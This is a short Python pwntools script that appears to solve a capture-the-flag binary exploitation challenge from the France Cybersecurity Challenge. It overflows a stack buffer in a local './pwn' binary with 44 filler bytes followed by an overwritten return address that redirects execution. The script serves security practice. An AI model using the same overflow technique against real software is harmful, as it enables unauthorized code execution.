from pwn import *
#cyclic, p32, process, raw_input

# io = remote("challenges.france-cybersecurity-challenge.fr", 2050)

#pl = cyclic(36)
# pl += p32(0x004011a2)
# pl += p32(0x0040205c)
RIP = p64(0x00402108)
OFFSET = "A" * 44


io = process("./pwn")
#raw_input("attach GDB")
io.sendline(OFFSET.encode() + RIP)
print(io.readlineS(False))
